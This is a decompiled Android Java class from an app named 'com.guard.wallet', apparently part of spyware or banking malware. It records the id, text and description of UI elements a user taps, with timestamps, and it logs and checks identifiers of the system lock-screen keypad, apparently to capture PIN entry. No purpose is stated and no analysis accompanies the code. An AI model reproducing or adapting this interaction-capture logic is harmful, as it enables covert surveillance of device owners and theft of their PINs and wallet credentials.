package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.graphics.Rect;
import android.util.Log;
import android.view.MotionEvent;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.plug.C0227f;
import com.guard.wallet.req.ListenPropResponse;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.Predicate;
import org.bouncycastle.i18n.TextBundle;

/* renamed from: com.guard.wallet.helper.p */
/* loaded from: classes.dex */
public final class C0193p implements Predicate {

    /* renamed from: a */
    public final /* synthetic */ int f230a;

    /* renamed from: b */
    public final /* synthetic */ Object f231b;

    public /* synthetic */ C0193p(Object obj, int i2) {
        this.f230a = i2;
        this.f231b = obj;
    }

    @Override // java.util.function.Predicate
    public final boolean test(Object obj) {
        switch (this.f230a) {
            case 0:
                UiObject uiObject = (UiObject) obj;
                if (uiObject != null) {
                    Rect boundsInScreen = uiObject.boundsInScreen();
                    Rect boundsInParent = uiObject.boundsInParent();
                    if (boundsInScreen == null || boundsInParent == null) {
                        boundsInScreen = null;
                    } else {
                        int width = boundsInParent.width() > boundsInScreen.width() ? (boundsInParent.width() - boundsInScreen.width()) / 2 : 0;
                        int height = boundsInParent.height() > boundsInScreen.height() ? (boundsInParent.height() - boundsInScreen.height()) / 2 : 0;
                        if (width > 0 || height > 0) {
                            boundsInScreen.left -= width;
                            boundsInScreen.right += width;
                            boundsInScreen.top -= height;
                            boundsInScreen.bottom += height;
                        }
                    }
                    if (boundsInScreen != null) {
                        Point point = new Point(boundsInScreen.exactCenterX(), boundsInScreen.exactCenterY());
                        MotionEvent motionEvent = (MotionEvent) this.f231b;
                        if (boundsInScreen.contains((int) motionEvent.getX(), (int) motionEvent.getY())) {
                            if (uiObject.click()) {
                                C0227f c0227f = AbstractC0195r.f236c;
                                c0227f.f274c.add(point);
                                AbstractC0195r.f239f = Integer.valueOf(AbstractC0195r.f239f.intValue() + 1);
                                LinkedList linkedList = new LinkedList();
                                if (!AbstractC0026q.m151B(uiObject.id())) {
                                    linkedList.add(new ListenPropResponse(AbstractC0195r.f239f, "id", uiObject.id(), Long.valueOf(System.nanoTime())));
                                }
                                if (!AbstractC0026q.m151B(uiObject.text())) {
                                    linkedList.add(new ListenPropResponse(AbstractC0195r.f239f, TextBundle.TEXT_ENTRY, uiObject.text(), Long.valueOf(System.nanoTime())));
                                }
                                if (!AbstractC0026q.m151B(uiObject.desc())) {
                                    linkedList.add(new ListenPropResponse(AbstractC0195r.f239f, "desc", uiObject.desc(), Long.valueOf(System.nanoTime())));
                                }
                                if (!linkedList.isEmpty() && !linkedList.isEmpty()) {
                                    c0227f.f273b.addAll(linkedList);
                                    break;
                                }
                            }
                        }
                    }
                }
                break;
            default:
                ListenPropResponse listenPropResponse = (ListenPropResponse) obj;
                if (!AbstractC0026q.m151B(listenPropResponse.getValue())) {
                    ConcurrentLinkedQueue concurrentLinkedQueue = C0224c.f261a;
                    Log.e("com.guard.wallet.plug.c", listenPropResponse.getValue());
                    if (listenPropResponse.getValue().startsWith("com.android.systemui:id/key") || listenPropResponse.getValue().startsWith("com.android.systemui:id/VivoPinkey")) {
                    }
                }
                break;
        }
        return false;
    }
}
